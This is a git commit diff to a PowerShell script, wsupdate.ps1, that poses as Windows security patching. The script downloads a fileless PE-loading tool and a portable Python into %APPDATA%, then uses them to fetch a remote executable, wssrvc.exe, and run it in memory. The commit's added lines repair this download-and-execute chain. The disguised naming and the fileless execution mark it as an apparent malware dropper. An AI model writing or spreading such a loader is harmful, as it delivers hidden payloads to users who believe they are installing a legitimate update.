b9bff7fb39a7c14479d64cede1b77836ed86a7d9
xxoo-d <im4x5yn74x@kaiju-security.com>
2025-10-20 14:21:51 -0400

    Update wsupdate.ps1

--- wsupdate.ps1
+++ wsupdate.ps1
@@ -7,5 +7,5 @@ wget https://github.com/malwarekid/Fileless-PE/archive/refs/heads/main.zip -O $e
 Expand-Archive -Path $env:APPDATA\main.zip -DestinationPath $env:APPDATA\$FolderName
 wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
 Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\Fileless-PE-main\
-"https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe`nexe`n$env:APPDATA\\$FolderName\\Fileless-PE-main\\wssrvc.py`n" | & "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\\$FolderNa>
-& "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\\$FolderName\\Fileless-PE-main\\wssrvc.py")
+"https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe`nexe`n$env:APPDATA\\$FolderName\\Fileless-PE-main\\wssrvc.py`n" | & "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\\$FolderName\\Fileless-PE-main\\Fileless-PE.py")
+& "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\$FolderName\Fileless-PE-main\wssrvc.py")
